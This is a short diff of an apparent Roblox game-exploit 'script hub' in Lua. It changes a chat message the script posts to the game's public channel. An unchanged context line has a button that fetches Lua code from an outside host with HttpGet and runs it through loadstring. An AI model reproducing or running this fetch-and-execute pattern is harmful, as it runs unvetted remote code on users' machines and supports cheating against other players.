@@ -49,7 +49,7 @@ StealABrainrotSection:NewButton("BrainrotHub", "idk lmaooo", function()
     loadstring(game:HttpGet("https://e-vil.com/anbu/awin.lua"))()
 end)
 
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("made by inverted NOW LOADING INVERTED HUB MUAHAHAHHAHAHAAH")
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("made by inverted NOW LOADING INVERTED HUB MUAHAHAHHAHAHAAH @e7sv on blue")
 
 -- Hubs
 local Hubs = Window:NewTab("Hubs")
